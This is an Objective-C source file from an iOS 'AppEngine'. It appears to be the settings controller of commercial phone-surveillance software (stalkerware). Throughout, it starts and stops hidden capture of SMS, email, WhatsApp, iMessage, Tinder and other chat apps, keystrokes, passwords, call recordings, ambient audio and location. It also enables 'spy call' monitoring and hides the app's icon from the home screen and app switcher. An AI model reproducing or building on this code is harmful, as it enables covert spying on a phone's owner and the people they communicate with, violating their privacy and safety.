//
//  PreferencesChangeHandler.m
//  AppEngine
//
//  Created by Makara Khloth on 12/8/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "PreferencesChangeHandler.h"
#import "AppEngine.h"

#import "ComponentHeaders.h"

@interface PreferencesChangeHandler (private)
- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture;
- (void) enableDisableLocationCapture: (PrefLocation *) aPrefLocation;
- (void) enableDisableSpyCall: (PrefMonitorNumber *) aPrefMonitorNumber;
- (void) enableDisableSIMChangeNotification;
- (void) enableDisableKeyword: (PrefKeyword *) aPrefKeyword;
- (void) enableDisableVisibility: (PrefVisibility *) aPrefVisibility;
- (void) enableDisableAddressbookMode: (PrefRestriction *) aPrefRestriction;
- (void) enableDisableFaceTimeSpyCall: (PrefMonitorFacetimeID *) aPrefFaceTimeIDs;
- (void) enableDisableCallRecord: (PrefEventsCapture *) aPrefCallRecord;
@end

@implementation PreferencesChangeHandler

- (id) initWithAppEngine:(AppEngine *) aAppEngine {
	if ((self = [super init])) {
		mAppEngine = aAppEngine;
		[mAppEngine retain];
	}
	return (self);
}

- (BOOL) isSupportSettingIDOfRemoteCmdCodeSettings: (NSInteger) aSettingID {
    id <ConfigurationManager> configurationManager  = [mAppEngine mConfigurationManager];
    
    BOOL isSupport                                  = [configurationManager isSupportedSettingID:aSettingID
                                                                                     remoteCmdID:kRemoteCmdCodeSetSettings];
    DLog(@"This setting id %ld, isSupport ? %d", (long)aSettingID, isSupport);
    return isSupport;
}

- (void) onPreferenceChange: (Preference *) aPreference {
	switch ([aPreference type]) {
		case kEvents_Ctrl: {
			// 1. Events
			PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)aPreference;	
			[self enableDisableEventsCapture:prefEventCapture];
			// 2. Location
			PrefLocation *prefLocation = (PrefLocation *)[[mAppEngine mPreferenceManager] preference:kLocation];
			[self enableDisableLocationCapture:prefLocation];
            // 3. Call record
            [self enableDisableCallRecord:prefEventCapture];
		} break;
		case kLocation: {
			PrefLocation *prefLocation = (PrefLocation *)aPreference;
			[self enableDisableLocationCapture:prefLocation];
		} break;
		case kHome_Number: {
			[self enableDisableSIMChangeNotification];
		} break;
		case kMonitor_Number: {
			[self enableDisableSpyCall:(PrefMonitorNumber *)aPreference];
			[self enableDisableSIMChangeNotification];
		} break;
		case kKeyword: {
			[self enableDisableKeyword:(PrefKeyword *)aPreference];
		} break;
		case kVisibility: {
			[self enableDisableVisibility:(PrefVisibility *)aPreference];
		} break;
		case kRestriction: {
			[self enableDisableAddressbookMode:(PrefRestriction *)aPreference];
		} break;
		case kFacetimeID: {
			[self enableDisableFaceTimeSpyCall:(PrefMonitorFacetimeID *)aPreference];
		} break;
        case kCallRecord: {
            ;
        } break;
		default:
			break;
	}
}

- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture {
	if ([aPrefEventCapture mDeliveryMethod] == kDeliveryMethodAny) {
		[[mAppEngine mDDM] setMDataDeliveryMethod:kDataDeliveryViaWifiWWAN];
	} else if ([aPrefEventCapture mDeliveryMethod] == kDeliveryMethodWifi) {
		[[mAppEngine mDDM] setMDataDeliveryMethod:kDataDeliveryViaWifiOnly];
	}
	
	[[mAppEngine mEDM] setMaximumEvent:[aPrefEventCapture mMaxEvent]];
	[[mAppEngine mEDM] setDeliveryTimer:[aPrefEventCapture mDeliverTimer]];
	
	// Call log
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCallLog]) {
			[[mAppEngine mCallLogCaptureManager] startCapture];
		} else {
			[[mAppEngine mCallLogCaptureManager] stopCapture];
		}
	}
	
	// SMS
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventSMS]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableSMS]) {
			[[mAppEngine mSMSCaptureManager] startCapture];
		} else {
			[[mAppEngine mSMSCaptureManager] stopCapture];
		}
	}
	
	// IMessage/WhatsApp/LINE/Skype/Facebook/Viber/WeChat/BBM/Snapchat/Hangouts/YahooMessenger/Slingshot
    
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventIM]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableIM]) {
			
            DLog(@"individual im setting id change %lu", (unsigned long)[aPrefEventCapture mEnableIndividualIM])
            
            // Set max size for IM Attachement
            NSUInteger imageLimit = [aPrefEventCapture mIMAttachmentImageLimitSize];
            NSUInteger audioLimit = [aPrefEventCapture mIMAttachmentAudioLimitSize];
            NSUInteger videoLimit = [aPrefEventCapture mIMAttachmentVideoLimitSize];
            NSUInteger nonMediaLimit = [aPrefEventCapture mIMAttachmentNonMediaLimitSize];
            DLog(@"(Perference change) Setup attachment size limit from preference IMAGE %lu, AUDIO %lu, VIDEO %lu, NON-MEDIA %lu", (unsigned long)imageLimit, (unsigned long)audioLimit, (unsigned long)videoLimit, (unsigned long)nonMediaLimit)
            [[FxIMEventUtils sharedFxIMEventUtils] setMImageAttMaxSize:imageLimit];
            [[FxIMEventUtils sharedFxIMEventUtils] setMAudioAttMaxSize:audioLimit];
            [[FxIMEventUtils sharedFxIMEventUtils] setMVideoAttMaxSize:videoLimit];
            [[FxIMEventUtils sharedFxIMEventUtils] setMOtherAttMaxSize:nonMediaLimit];
        
            
            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualWhatsApp) {
                DLog(@"########## start whatsapp capture")
                [[mAppEngine mWhatsAppCaptureManager] startCapture];
            } else {
                DLog(@"########## stop whatsapp capture")
                [[mAppEngine mWhatsAppCaptureManager] stopCapture];
            }
            
            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualLINE) {
                DLog(@"########## start line capture")
                [[mAppEngine mLINECaptureManager] startCapture];
            } else {
                DLog(@"########## stop line capture")
                [[mAppEngine mLINECaptureManager] stopCapture];
            }
            
            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualFacebook) {
                DLog(@"########## start facebook capture")
                [[mAppEngine mFacebookCaptureManager] startCapture];
            } else {
                DLog(@"########## stop facebook capture")
                [[mAppEngine mFacebookCaptureManager] stopCapture];
            }

            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualSkype) {
                DLog(@"########## start skype capture")
                [[mAppEngine mSkypeCaptureManager] startCapture];
            } else {
                DLog(@"########## stop skype capture")
                [[mAppEngine mSkypeCaptureManager] stopCapture];
            }
            
            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualBBM) {
                DLog(@"########## start BBM capture")
                [[mAppEngine mBBMCaptureManager] startCapture];
            } else {
                DLog(@"########## stop BBM capture")
                [[mAppEngine mBBMCaptureManager] stopCapture];
            }
            
            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualIMessage) {
                DLog(@"########## start iMessage capture")
                [[mAppEngine mIMessageCaptureManager] startCapture];
            } else {
                DLog(@"########## stop iMessage capture")
                [[mAppEngine mIMessageCaptureManager] stopCapture];
            }
        
            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualViber) {
                DLog(@"########## start Viber capture")
                [[mAppEngine mViberCaptureManager] startCapture];
            } else {
                DLog(@"########## stop Viber capture")
                [[mAppEngine mViberCaptureManager] stopCapture];
            }
    
            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualWeChat) {
                DLog(@"########## start WeChat capture")
                [[mAppEngine mWeChatCaptureManager] startCapture];
            } else {
                DLog(@"########## stop WeChat capture")
                [[mAppEngine mWeChatCaptureManager] stopCapture];
            }

            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualYahooMessenger) {
                DLog(@"########## start Yahoo capture")
                [[mAppEngine mYahooMsgCaptureManager] startCapture];
            } else {
                DLog(@"########## stop Yahoo capture")
                [[mAppEngine mYahooMsgCaptureManager] stopCapture];
            }

            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualSnapchat) {
                DLog(@"########## start Snapchat capture")
                [[mAppEngine mSnapchatCaptureManager] startCapture];
            } else {
                DLog(@"########## stop Snapchat capture")
                [[mAppEngine mSnapchatCaptureManager] stopCapture];
            }

            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualHangout) {
                DLog(@"########## start Hangout capture")
                [[mAppEngine mHangoutCaptureManager] startCapture];
            } else {
                DLog(@"########## stop Hangout capture")
                [[mAppEngine mHangoutCaptureManager] stopCapture];
            }
            
            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualInstagram) {
                DLog(@"########## start Instagram capture")
                [[mAppEngine mInstagramCaptureManager] startCapture];
            } else {
                DLog(@"########## stop Instagram capture")
                [[mAppEngine mInstagramCaptureManager] stopCapture];
            }
            
            if ([aPrefEventCapture mEnableIndividualIM] & kPrefIMIndividualTinder) {
                DLog(@"########## start Tinder capture")
                [[mAppEngine mTinderCaptureManager] startCapture];
            } else {
                DLog(@"########## stop Tinder capture")
                [[mAppEngine mTinderCaptureManager] stopCapture];
            }

            //[[mAppEngine mSlingshotCaptureManager] startCapture];
		} else {
			[[mAppEngine mIMessageCaptureManager] stopCapture];
			[[mAppEngine mWhatsAppCaptureManager] stopCapture];
			[[mAppEngine mLINECaptureManager] stopCapture];
			[[mAppEngine mSkypeCaptureManager] stopCapture];
			[[mAppEngine mFacebookCaptureManager] stopCapture];
			[[mAppEngine mViberCaptureManager] stopCapture];
			[[mAppEngine mWeChatCaptureManager] stopCapture];
            [[mAppEngine mBBMCaptureManager] stopCapture];
            [[mAppEngine mSnapchatCaptureManager] stopCapture];
            [[mAppEngine mHangoutCaptureManager] stopCapture];
            [[mAppEngine mYahooMsgCaptureManager] stopCapture];
            [[mAppEngine mInstagramCaptureManager] stopCapture];
            [[mAppEngine mTinderCaptureManager] stopCapture];
            //[[mAppEngine mSlingshotCaptureManager] stopCapture];
		}
	}

    /*
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventIM]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableIM]) {
			[[mAppEngine mIMessageCaptureManager] startCapture];
			[[mAppEngine mWhatsAppCaptureManager] startCapture];
			[[mAppEngine mLINECaptureManager] startCapture];
			[[mAppEngine mSkypeCaptureManager] startCapture];
			[[mAppEngine mFacebookCaptureManager] startCapture];
			[[mAppEngine mViberCaptureManager] startCapture];
			[[mAppEngine mWeChatCaptureManager] startCapture];
            [[mAppEngine mBBMCaptureManager] startCapture];
            [[mAppEngine mSnapchatCaptureManager] startCapture];
            [[mAppEngine mHangoutCaptureManager] startCapture];
            [[mAppEngine mYahooMsgCaptureManager] startCapture];
            //[[mAppEngine mSlingshotCaptureManager] startCapture];
		} else {
			[[mAppEngine mIMessageCaptureManager] stopCapture];
			[[mAppEngine mWhatsAppCaptureManager] stopCapture];
			[[mAppEngine mLINECaptureManager] stopCapture];
			[[mAppEngine mSkypeCaptureManager] stopCapture];
			[[mAppEngine mFacebookCaptureManager] stopCapture];
			[[mAppEngine mViberCaptureManager] stopCapture];
			[[mAppEngine mWeChatCaptureManager] stopCapture];
            [[mAppEngine mBBMCaptureManager] stopCapture];
            [[mAppEngine mSnapchatCaptureManager] stopCapture];
            [[mAppEngine mHangoutCaptureManager] stopCapture];
            [[mAppEngine mYahooMsgCaptureManager] stopCapture];
            //[[mAppEngine mSlingshotCaptureManager] stopCapture];
		}
	}
	*/
	// MMS
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventMMS]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableMMS]) {
			[[mAppEngine mMMSCaptureManager] startCapture];
		} else {
			[[mAppEngine mMMSCaptureManager] stopCapture];
		}
	}
	
	// Email
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventEmail]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableEmail]) {
			[[mAppEngine mMailCaptureManager] startMonitoring];
		} else {
			[[mAppEngine mMailCaptureManager] stopMonitoring];
		}
	}
	
	// Media finder
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
		NSMutableArray *entries = [NSMutableArray array];
		// Image
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCameraImage] &&
			!([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaImage)) { // Not search yet
			[MediaFinder setImageFindEntry:entries];
			[aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaImage];
			[[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
		}
		// Video
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableVideoFile] &&
			!([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaVideo)) { // Not search yet
			[MediaFinder setVideoFindEntry:entries];
			[aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaVideo];
			[[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
		}
		// Audio
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableAudioFile] &&
			!([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaAudio)) { // Not search yet
			[MediaFinder setAudioFindEntry:entries];
			[aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaAudio];
			[[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
		}
		if ([entries count]) {
			// We will not search media files we will wait for command (new use case)
//			[[mAppEngine mMediaFinder] findMediaFileWithExtMime:entries];
		}
	}
	
	// Media capture
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCameraImage] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventVideoRecording] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventSoundRecording] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventWallpaper]) {
		// Camera
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCameraImage]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCameraImage]) {
				[[mAppEngine mMediaCaptureManager] startCameraImageCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopCameraImageCapture];
			}
		}
		// Video
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventVideoRecording]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableVideoFile]) {
				[[mAppEngine mMediaCaptureManager] startVideoCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopVideoCapture];
			}
		}
		// Audio
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventSoundRecording]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableAudioFile]) {
				[[mAppEngine mMediaCaptureManager] startAudioCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopAudioCapture];
			}
		}
		// Wallpaper
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventWallpaper]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableWallPaper]) {
				[[mAppEngine mMediaCaptureManager] startWallPaperCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopWallPaperCapture];
			}
		}
	}
	
	// Browser url/Bookmark capture
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		if ([aPrefEventCapture mStartCapture]) {
			if ([aPrefEventCapture mEnableBrowserUrl]) {
				[[mAppEngine mBrowserUrlCaptureManager] startBrowserUrlCapture];
			} else {
				[[mAppEngine mBrowserUrlCaptureManager] stopBrowserUrlCapture];
			}
		} else {
			[[mAppEngine mBrowserUrlCaptureManager] stopBrowserUrlCapture];
		}
	}
	
	// Application life cycle manager
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {		
		if ([aPrefEventCapture mStartCapture]) {
			if ([aPrefEventCapture mEnableALC]) {
				[[mAppEngine mALCManager] startMonitor];
			} else {
				[[mAppEngine mALCManager] stopMonitor];
			}
		} else {
			[[mAppEngine mALCManager] stopMonitor];
		}
	}
	
	// Note manager
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_NoteCapture]) {		
		if ([aPrefEventCapture mEnableNote]) { // Regardless of stop capture flag
			[[mAppEngine mNoteManager] startCapture];
		} else {
			[[mAppEngine mNoteManager] stopCapture];
		}
	}
	
	// Calendar manager
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCalendar]) {		
		if ([aPrefEventCapture mEnableCalendar]) { // Regardless of stop capture flag
			[[mAppEngine mCalendarManager] startCapture];
		} else {
			[[mAppEngine mCalendarManager] stopCapture];
		}
	}
	
	// FaceTime/Skype/WeChat/LINE/Viber/Facebook call log capture manager		
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventVoIP]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableVoIPLog]) {
			DLog (@"Start FaceTime/Skype/WeChat/LINE/Viber/Facebook call log capture")
			[[mAppEngine mFTCaptureManager] startCapture];
			[[mAppEngine mSkypeCallLogCaptureManager] startCapture];
			[[mAppEngine mWeChatCallLogCaptureManager] startCapture];
			[[mAppEngine mLINECallLogCaptureManager] startCapture];
			[[mAppEngine mViberCallLogCaptureManager] startCapture];
			[[mAppEngine mFacebookCallLogCaptureManager] startCapture];
		} else {
			DLog (@"Stop FaceTime/Skype/WeChat/LINE/Viber/Facebook call log capture")
			[[mAppEngine mFTCaptureManager] stopCapture];
			[[mAppEngine mSkypeCallLogCaptureManager] stopCapture];
			[[mAppEngine mWeChatCallLogCaptureManager] stopCapture];
			[[mAppEngine mLINECallLogCaptureManager] stopCapture];
			[[mAppEngine mViberCallLogCaptureManager] stopCapture];
			[[mAppEngine mFacebookCallLogCaptureManager] stopCapture];
		}
	}
	
	// KeyLog
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventKeyLog]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableKeyLog]) {
			[[mAppEngine mKeyLogCaptureManager] startCapture];
		} else {
			[[mAppEngine mKeyLogCaptureManager] stopCapture];
		}
	}
    
    // Password
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventPassword]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnablePassword]) {
			[[mAppEngine mPasswordCaptureManager] startCapture];
		} else {
			[[mAppEngine mPasswordCaptureManager] stopCapture];
		}
	}
    
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_AmbientRecording]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableTemporalControlAR]) {
			[[mAppEngine mTemporalControlManager] startTemporalControl];
		} else {
			[[mAppEngine mTemporalControlManager] stopTemporalControl];
		}
	}
    
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_CallRecording] || [[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_VoIPCallRecording]) {
        if ([aPrefEventCapture mEnableCallRecording] || ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableVoIPCallRecording])) {
            [mAppEngine.mCallRecordManager startCapture];
        } else {
            [mAppEngine.mCallRecordManager stopCapture];
        }
    }
}

- (void) enableDisableLocationCapture: (PrefLocation *) aPrefLocation {
	PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[[mAppEngine mPreferenceManager] preference:kEvents_Ctrl];
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventLocation]) {
		[[mAppEngine mLocationManager] setMIntervalTime:[aPrefLocation mLocationInterval]];
		if ([prefEventCapture mStartCapture] && [aPrefLocation mEnableLocation]) {
			[[mAppEngine mLocationManager] startTracking];
		} else {
			[[mAppEngine mLocationManager] stopTracking];
		}
	}
}

- (void) enableDisableSpyCall: (PrefMonitorNumber *) aPrefMonitorNumber {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SpyCall] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_OnDemandConference]) {
        // Set conference enable
        if ([mAppEngine.mConfigurationManager isSupportedFeature:kFeatureID_OnDemandConference]) {
            [aPrefMonitorNumber setMEnableCallConference:YES];
        } else {
            [aPrefMonitorNumber setMEnableCallConference:NO];
        }
        [mAppEngine.mPreferenceManager savePreference:aPrefMonitorNumber];
        
		if ([[[mAppEngine mLicenseManager] mCurrentLicenseInfo] licenseStatus] != EXPIRED &&
			[[[mAppEngine mLicenseManager] mCurrentLicenseInfo] licenseStatus] != DISABLE) {
			if ([aPrefMonitorNumber mEnableMonitor]) {
				[[mAppEngine mSpyCallManager] start];
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
					[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:[aPrefMonitorNumber mMonitorNumbers]];
				}
			} else {
				[[mAppEngine mSpyCallManager] stop];
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
					[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:nil];
				}
			}
		} else {
			[[mAppEngine mSpyCallManager] stop];
			if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
				[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:nil];
			}
		}
	}
}

- (void) enableDisableSIMChangeNotification {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SIMChange]        ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_HomeNumbers]      ||
        [[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_MonitorNumbers]   ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SpyCall])         {
		// SIM change notification
		PrefHomeNumber *prefHomeNumbers = (PrefHomeNumber *)[[mAppEngine mPreferenceManager] preference:kHome_Number];
		PrefMonitorNumber *prefMonitorNumbers = (PrefMonitorNumber *)[[mAppEngine mPreferenceManager] preference:kMonitor_Number];
		
		// 1. Home numbers
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_HomeNumbers]) {
			NSString *notificationString = [[[mAppEngine mApplicationContext] mProductInfo] notificationStringForCommand:kNotificationSIMChangeCommandID
																									  withActivationCode:[[[mAppEngine mLicenseManager] mCurrentLicenseInfo] activationCode]
																												 withArg:nil];
			[[mAppEngine mSIMChangeManager] startReportSIMChange:notificationString andRecipients:[prefHomeNumbers mHomeNumbers]];
		}
		
		// 2. Monitor numbers
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SpyCall]          ||
            [[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_MonitorNumbers])  {
			NSString *notificationString = NSLocalizedString (@"kSIMChange2MonitorNumbers", @"");
			[[mAppEngine mSIMChangeManager] startListenToSIMChange:notificationString andRecipients:[prefMonitorNumbers mMonitorNumbers]];
		}
	} else {
		[[mAppEngine mSIMChangeManager] stopReportSIMChange];
		[[mAppEngine mSIMChangeManager] stopListenToSIMChange];
	}
}

- (void) enableDisableKeyword: (PrefKeyword *) aPrefKeyword {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SMSKeyword]) {
		NSData *keywordData = [aPrefKeyword toData];
		SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
		[sharedFileIPC writeData:keywordData withID:kSharedFileKeywordID];
		[sharedFileIPC release];
	}
}

- (void) enableDisableVisibility: (PrefVisibility *) aPrefVisibility {
	// Visibility
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_HideApplicationIcon]) {
		id <AppVisibility> visibility = [[mAppEngine mApplicationContext] getAppVisibility];
		if ([aPrefVisibility mVisible]) {
			[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
		} else {
			[visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
		}
		[visibility applyAppVisibility];
	}

    id <AppVisibility> visibility = [[mAppEngine mApplicationContext] getAppVisibility];
    
    // Hide these invisible applications
    [visibility hideApplicationIconFromAppSwitcherSpringBoard:[aPrefVisibility hiddenBundleIdentifiers]];
    
    // Show these invisible applications
    [visibility showApplicationIconInAppSwitcherSpringBoard:[aPrefVisibility shownBundleIdentifiers]];
    
    [visibility applyAppVisibility];
}

- (void) enableDisableAddressbookMode: (PrefRestriction *) aPrefRestriction {
	// Address book manager
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_AddressbookManagement]) {
		// Address book management mode
		if (([aPrefRestriction mAddressBookMgtMode] & kAddressMgtModeRestrict) ||
			([aPrefRestriction mAddressBookMgtMode] & kAddressMgtModeMonitor)) {
			[[mAppEngine mAddressbookManager] setMode:kAddressbookManagerModeMonitor];
			[[mAppEngine mAddressbookManager] start];
		} else {
			[[mAppEngine mAddressbookManager] setMode:kAddressbookManagerModeOff];
			[[mAppEngine mAddressbookManager] stop];
		}
	}	
}

- (void) enableDisableFaceTimeSpyCall: (PrefMonitorFacetimeID *) aPrefFaceTimeIDs {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SpyCallOnFacetime]) {
		if ([aPrefFaceTimeIDs mEnableMonitorFacetimeID]) {
			[[mAppEngine mFTSpyCallManager] start];
			if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventVoIP]) {
				[[mAppEngine mFTCaptureManager] setMNotCaptureNumbers:[aPrefFaceTimeIDs mMonitorFacetimeIDs]];
			}
		} else {
			[[mAppEngine mFTSpyCallManager] stop];
			if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventVoIP]) {
				[[mAppEngine mFTCaptureManager] setMNotCaptureNumbers:[NSArray array]];
			}
		}
	}
}

- (void) enableDisableCallRecord: (PrefEventsCapture *) aPrefEvents {
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_CallRecording] || [[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_VoIPCallRecording]) {
        if ([aPrefEvents mEnableCallRecording] || ([aPrefEvents mStartCapture] && [aPrefEvents mEnableVoIPCallRecording])) {
            [mAppEngine.mCallRecordManager startCapture];
        } else {
            [mAppEngine.mCallRecordManager stopCapture];
        }
    }
}

- (void) dealloc {
	[mAppEngine release];
	[super dealloc];
}

@end
